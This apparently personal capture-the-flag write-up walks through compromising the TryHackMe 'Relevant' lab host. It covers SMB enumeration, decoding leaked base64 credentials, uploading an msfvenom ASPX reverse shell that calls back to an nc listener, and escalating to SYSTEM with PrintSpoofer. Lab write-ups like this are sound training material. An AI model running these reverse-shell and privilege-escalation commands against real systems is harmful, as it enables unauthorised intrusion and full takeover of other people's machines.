---
layout: post
title:  "THM - Relevant"
image: /images/rele.jpg
---


## THM - Relevant


#### Port Scan

```bash
sudo nmap -A -O -sS $ip 
```

```bash
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
```

#### Enum Shares

```bash
smbclient \\\\relevant\\nt4wrksv
```

```bash
smb: \> mget passwords.txt
```

```bash                                                                       
┌──(kali㉿Zeus)-[~/Desktop]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                     
```

#### Creds

```bash    
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$   
```

###### Upload Reverse Shell

- [ASPX - Reverse Shell](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.28.219 LPORT=4444 -f aspx > reverse.aspx                               
smbclient \\\\relevant\\nt4wrksv                                                             
put reverse.aspx
curl http://10.10.103.93:49663/nt4wrksv/reverse.aspx
```

```bash
nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.8.28.219] from (UNKNOWN) [10.10.103.93] 49881
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

#### Priv Esc

```bash
c:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

#### PrintSpoofer

```bash
smbclient \\\\relevant\\nt4wrksv
put PrintSpoofer.exe
```

#### Rooted

```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

#### Resources

https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/

https://github.com/dievus/printspoofer